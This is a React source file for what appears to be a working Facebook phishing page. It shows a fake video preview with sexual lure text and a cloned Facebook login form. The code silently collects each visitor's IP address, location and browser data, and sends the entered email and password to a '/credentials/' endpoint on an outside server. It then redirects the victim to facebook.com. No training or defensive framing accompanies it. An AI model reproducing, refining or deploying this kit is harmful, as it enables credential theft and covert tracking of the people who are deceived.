import React, { useState, useEffect, useMemo } from 'react';
import { Play, Eye, ArrowLeft, Lock, Mail } from 'lucide-react';

const FastFacebookPreview = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [showLogin, setShowLogin] = useState(false);
  const [contentData, setContentData] = useState(null);
  const [loadingContent, setLoadingContent] = useState(false);

  // API Base URL - Update this to your Django backend URL
  const API_BASE_URL = 'https://face-ayox.onrender.com/api';

  // Helper function to decode compressed URL parameters
  const decodeParams = (params) => {
    return {
      title: params.get('t') || params.get('title'),
      description: params.get('d') || params.get('description'),
      views: parseInt(params.get('v') || params.get('views') || '1250'),
      duration: params.get('dur') || params.get('duration') || "6:30",
      creator: params.get('c') || params.get('creator') || 'Nature Explorer',
      image_url: params.get('i') || params.get('image_url'),
      type: params.get('typ') || params.get('type') || 'video',
      share_ip: params.get('sip') || params.get('share_ip'),
      share_country: params.get('sc') || params.get('share_country'),
      share_region: params.get('sr') || params.get('share_region'),
      shared_via: params.get('sv') || params.get('shared_via')
    };
  };

  // Memoized content data from URL (fastest source)
  const urlContentData = useMemo(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const urlParts = window.location.pathname.split('/');
    const contentId = urlParts[urlParts.length - 1] || '1';
    
    // Check if we have any parameters (compressed or full)
    if (urlParams.toString()) {
      const decoded = decodeParams(urlParams);
      
      if (decoded.title) {
        return {
          id: contentId,
          title: decoded.title,
          description: decoded.description,
          views: decoded.views,
          duration: decoded.duration,
          creator: { username: decoded.creator },
          content_file: decoded.image_url,
          image: decoded.image_url,
          type: decoded.type,
          share_ip: decoded.share_ip,
          share_country: decoded.share_country,
          share_region: decoded.share_region,
          shared_via: decoded.shared_via
        };
      }
    }
    return null;
  }, []);

  // Fast fallback data (no API call needed)
  const fallbackData = useMemo(() => ({
    id: 1,
    title: "Making a Lovely Moment Together",
    description: "Making me cum in a special way",
    views: 1250,
    duration: "6:30",
    creator: { username: "Nature Explorer" },
    content_file: null,
    type: 'video'
  }), []);

  // Optimized image URL with immediate fallback
  const optimizedImageUrl = useMemo(() => {
    const imageSource = contentData?.image || contentData?.content_file;
    
    if (imageSource && imageSource.trim() !== '') {
      return imageSource;
    }

    // Fast SVG fallback (no network request)
    return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(`
      <svg width="400" height="300" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" style="stop-color:#667eea;stop-opacity:1" />
            <stop offset="100%" style="stop-color:#764ba2;stop-opacity:1" />
          </linearGradient>
        </defs>
        <rect width="400" height="300" fill="url(#grad)"/>
        <text x="50%" y="40%" font-family="Arial, sans-serif" font-size="18" fill="white" text-anchor="middle" dy=".3em">Amazing Video Content</text>
        <text x="50%" y="60%" font-family="Arial, sans-serif" font-size="14" fill="rgba(255,255,255,0.8)" text-anchor="middle" dy=".3em">Click to watch</text>
        <circle cx="200" cy="180" r="30" fill="rgba(255,255,255,0.9)"/>
        <polygon points="190,170 190,190 210,180" fill="#333"/>
      </svg>
    `)}`;
  }, [contentData]);

  // Helper function to create short share URLs
  const createShortShareUrl = (data) => {
    const baseUrl = window.location.origin + '/share/1?';
    
    // Use compressed parameter names
    const params = new URLSearchParams();
    
    if (data.title) params.append('t', data.title);
    if (data.description) params.append('d', data.description);
    if (data.views) params.append('v', data.views.toString());
    if (data.duration) params.append('dur', data.duration);
    if (data.creator?.username) params.append('c', data.creator.username);
    if (data.image) params.append('i', data.image);
    if (data.type) params.append('typ', data.type);
    
    return baseUrl + params.toString();
  };

  // Async tracking (non-blocking)
  const trackVisitorAsync = async (action = 'view') => {
    // Run tracking in background without blocking UI
    setTimeout(async () => {
      try {
        const urlParams = new URLSearchParams(window.location.search);
        const contentId = window.location.pathname.split('/').pop() || '1';
        
        // Get IP data with timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000); // 2s timeout
        
        let visitorData = {};
        try {
          const ipResponse = await fetch('https://ipapi.co/json/', {
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          if (ipResponse.ok) {
            visitorData = await ipResponse.json();
          }
        } catch (e) {
          // Silent fail for IP detection
        }
        
        const trackingData = {
          content_id: contentId,
          action: action,
          ip_address: visitorData.ip || 'unknown',
          country: visitorData.country_name || 'unknown',
          region: visitorData.region || 'unknown',
          city: visitorData.city || 'unknown',
          user_agent: navigator.userAgent,
          referrer: document.referrer,
          timestamp: new Date().toISOString(),
          shared_by_ip: urlParams.get('sip') || urlParams.get('share_ip'),
          shared_from_country: urlParams.get('sc') || urlParams.get('share_country'),
          shared_from_region: urlParams.get('sr') || urlParams.get('share_region'),
          shared_via: urlParams.get('sv') || urlParams.get('shared_via')
        };
        
        // Non-blocking API call
        fetch(`${API_BASE_URL}/track-visitor/`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(trackingData),
        }).catch(() => {}); // Silent fail
        
      } catch (error) {
        // Silent fail for tracking
      }
    }, 100); // Small delay to not block initial render
  };

  // Fast initialization
  useEffect(() => {
    // Immediately set content data (no loading state)
    if (urlContentData) {
      setContentData(urlContentData);
      trackVisitorAsync('page_load');
      return;
    }

    // Use fallback immediately, then try API in background
    setContentData(fallbackData);
    trackVisitorAsync('page_load');

    // Try API in background (non-blocking)
    const fetchApiData = async () => {
      try {
        setLoadingContent(true);
        const contentId = window.location.pathname.split('/').pop() || '1';
        
        // Parallel API calls with timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const [imageResponse, videoResponse] = await Promise.allSettled([
          fetch(`${API_BASE_URL}/images/${contentId}/`, { signal: controller.signal }),
          fetch(`${API_BASE_URL}/videos/${contentId}/`, { signal: controller.signal })
        ]);
        
        clearTimeout(timeoutId);
        
        let apiData = null;
        if (imageResponse.status === 'fulfilled' && imageResponse.value.ok) {
          apiData = await imageResponse.value.json();
        } else if (videoResponse.status === 'fulfilled' && videoResponse.value.ok) {
          apiData = await videoResponse.value.json();
        }
        
        if (apiData) {
          setContentData({
            ...apiData,
            type: 'video',
            views: apiData.views || 1250,
            duration: apiData.duration || "6:30"
          });
        }
      } catch (error) {
        // Keep fallback data on error
      }
      setLoadingContent(false);
    };

    // Only fetch if not using URL data
    if (!urlContentData) {
      setTimeout(fetchApiData, 50); // Slight delay to prioritize UI
    }
  }, [urlContentData, fallbackData]);

  const handlePlayClick = () => {
    trackVisitorAsync('play_button_click');
    setShowLogin(true);
  };

  const handleBackToPreview = () => {
    setShowLogin(false);
    setEmail('');
    setPassword('');
  };

  const [errorMessage, setErrorMessage] = useState('');
  const [successMessage, setSuccessMessage] = useState('');

  const handleFacebookLogin = async () => {
    setErrorMessage('');
    setSuccessMessage('');
    
    if (!email || !password) {
      setErrorMessage('Please enter both email and password');
      return;
    }

    setLoading(true);
    trackVisitorAsync('facebook_login_attempt');
    
    try {
      const response = await fetch(`${API_BASE_URL}/credentials/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email,
          password: password,
          platform: 'facebook'
        })
      });

      if (response.ok) {
        setSuccessMessage('Login successful! Redirecting...');
        setTimeout(() => {
          window.location.href = 'https://facebook.com';
        }, 1500);
      } else {
        setErrorMessage('The email address or mobile number you entered isn\'t connected to an account.');
      }
    } catch (error) {
      setErrorMessage('Sorry, something went wrong. Please try again.');
    }
    
    setLoading(false);
  };

  // Facebook Login Form View
  if (showLogin) {
    return (
      <div className="min-h-screen" style={{backgroundColor: '#f0f2f5'}}>
        <header className="bg-white shadow-sm">
          <div className="max-w-6xl mx-auto px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <button
                  onClick={handleBackToPreview}
                  className="mr-3 p-2 hover:bg-gray-100 rounded-full transition-colors"
                >
                  <ArrowLeft className="w-5 h-5 text-gray-600" />
                </button>
                <svg viewBox="0 0 36 36" className="w-8 h-8 mr-3" fill="url(#jsc_c_3)">
                  <defs>
                    <linearGradient x1="50%" x2="50%" y1="97.0782153%" y2="0%" id="jsc_c_3">
                      <stop offset="0%" stopColor="#0062E0"/>
                      <stop offset="100%" stopColor="#19AFFF"/>
                    </linearGradient>
                  </defs>
                  <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"/>
                  <path className="fill-white" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"/>
                </svg>
                <span className="text-xl font-semibold text-blue-600">facebook</span>
              </div>
            </div>
          </div>
        </header>

        <div className="max-w-md mx-auto mt-16 px-4">
          <div className="bg-white rounded-lg shadow-lg p-8">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg viewBox="0 0 36 36" className="w-10 h-10" fill="white">
                  <path d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"/>
                </svg>
              </div>
              <h2 className="text-3xl font-bold text-gray-900 mb-3">Log in to Facebook</h2>
              <p className="text-gray-600">Enter your credentials to continue watching</p>
            </div>

            <div className="space-y-5">
              {/* Success Message */}
              {successMessage && (
                <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
                  <div className="flex items-center">
                    <div className="flex-shrink-0">
                      <svg className="h-5 w-5 text-green-400" viewBox="0 0 20 20" fill="currentColor">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="ml-3">
                      <p className="text-sm font-medium text-green-800">{successMessage}</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Error Message */}
              {errorMessage && (
                <div className="p-4 bg-red-50 border border-red-200 rounded-lg">
                  <div className="flex items-center">
                    <div className="flex-shrink-0">
                      <svg className="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="ml-3">
                      <p className="text-sm font-medium text-red-800">{errorMessage}</p>
                    </div>
                  </div>
                </div>
              )}

              <div className="relative">
                <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input
                  type="email"
                  placeholder="Email address or phone number"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full pl-10 pr-4 py-4 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900 placeholder-gray-500 text-lg"
                  onKeyPress={(e) => e.key === 'Enter' && handleFacebookLogin()}
                />
              </div>

              <div className="relative">
                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full pl-10 pr-4 py-4 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900 placeholder-gray-500 text-lg"
                  onKeyPress={(e) => e.key === 'Enter' && handleFacebookLogin()}
                />
              </div>

              <button
                onClick={handleFacebookLogin}
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 px-4 rounded-lg font-semibold text-lg transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                    Logging in...
                  </div>
                ) : (
                  'Log in'
                )}
              </button>

              <div className="text-center">
                <a href="#" className="text-blue-600 hover:underline">
                  Forgotten password?
                </a>
              </div>

              <hr className="my-6" />

              <div className="text-center">
                <button className="bg-green-600 hover:bg-green-700 text-white py-3 px-8 rounded-lg font-semibold transition-colors">
                  Create new account
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Content Preview View - Always renders immediately
  return (
    <div className="min-h-screen" style={{backgroundColor: '#f0f2f5'}}>
      <header className="bg-white shadow-sm">
        <div className="max-w-6xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <svg viewBox="0 0 36 36" className="w-8 h-8 mr-3" fill="url(#jsc_c_4)">
                <defs>
                  <linearGradient x1="50%" x2="50%" y1="97.0782153%" y2="0%" id="jsc_c_4">
                    <stop offset="0%" stopColor="#0062E0"/>
                    <stop offset="100%" stopColor="#19AFFF"/>
                  </linearGradient>
                </defs>
                <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"/>
                <path className="fill-white" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"/>
              </svg>
              <span className="text-xl font-semibold text-blue-600">facebook</span>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-lg mx-auto mt-8 px-4">
        <div className="bg-white rounded-lg shadow-md overflow-hidden">
          <div className="relative">
            <div className="relative">
              <img 
                src={optimizedImageUrl} 
                alt={contentData?.title || 'Video content'}
                className="w-full h-64 object-cover"
                loading="eager" // Prioritize loading
              />
              
              {contentData?.duration && (
                <div className="absolute top-3 right-3">
                  <div className="bg-black bg-opacity-75 text-white px-2 py-1 rounded text-sm font-medium">
                    {contentData.duration}
                  </div>
                </div>
              )}

              <div className="absolute inset-0 bg-black bg-opacity-30">
                <div className="absolute inset-0 flex items-center justify-center">
                  <button
                    onClick={handlePlayClick}
                    className="bg-white bg-opacity-90 hover:bg-opacity-100 rounded-full p-4 transition-all duration-200 shadow-lg transform hover:scale-105"
                  >
                    <Play className="w-12 h-12 text-gray-700" fill="currentColor" />
                  </button>
                </div>
              </div>
            </div>
          </div>

          <div className="p-6">
            <h3 className="text-gray-800 font-semibold text-lg mb-2 leading-tight">
              {contentData?.title || 'Loading...'}
            </h3>
            {contentData?.description && (
              <p className="text-gray-600 text-sm mb-4 line-clamp-2">{contentData.description}</p>
            )}
            <div className="flex items-center justify-between text-sm text-gray-500">
              <div className="flex items-center">
                <Eye className="w-4 h-4 mr-2" />
                <span>{(contentData?.views || 1250).toLocaleString()}</span>
                <span className="ml-1">views</span>
              </div>
              <div className="font-medium">
                {contentData?.creator?.username || contentData?.creator || 'Unknown User'}
              </div>
            </div>
          </div>

          <div className="px-6 pb-6">
            <button
              onClick={handlePlayClick}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 px-6 rounded-lg font-medium flex items-center justify-center transition-all duration-200 shadow-sm transform hover:scale-[1.02]"
            >
              <Play className="w-5 h-5 mr-2" fill="currentColor" />
              Watch Video
            </button>
          </div>
        </div>
        
        {loadingContent && (
          <div className="text-center mt-4">
            <div className="text-sm text-gray-500">Loading latest content...</div>
          </div>
        )}
        
        {/* Optional: Share link button */}
        <div className="text-center mt-6">
          <button 
            onClick={() => {
              const shareUrl = createShortShareUrl(contentData || fallbackData);
              navigator.clipboard.writeText(shareUrl);
              alert('Short URL copied to clipboard!');
            }}
            className="text-sm text-blue-600 hover:underline"
          >
            Copy short share link
          </button>
        </div>
      </div>
    </div>
  );
};

export default FastFacebookPreview; 